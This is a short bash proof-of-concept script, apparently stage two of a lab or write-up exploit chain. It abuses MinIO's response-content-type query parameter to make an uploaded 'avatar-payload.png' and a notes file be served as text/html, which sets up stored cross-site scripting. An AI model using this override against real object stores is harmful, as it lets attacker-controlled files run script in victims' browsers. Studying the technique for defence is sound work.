#!/usr/bin/env bash
# Stage 2: the MinIO trick from the writeup. One query parameter on the same
# public object and WE decide the Content-Type the browser receives.
set -euo pipefail

BASE="${MINIO_URL:-http://127.0.0.1:9000}"
KEY="${1:-public/avatar-payload.png}"

echo "GET ${BASE}/${KEY}?response-content-type=text/html"
echo "--- response ---"
curl -sS -D - -o /dev/null "${BASE}/${KEY}?response-content-type=text/html"

echo
echo "--- same trick on the text/plain notes object ---"
curl -sS -D - -o /dev/null \
  "${BASE}/public/secret-notes.txt?response-content-type=text/html" \
  | grep -i '^content-type' | tail -n 1
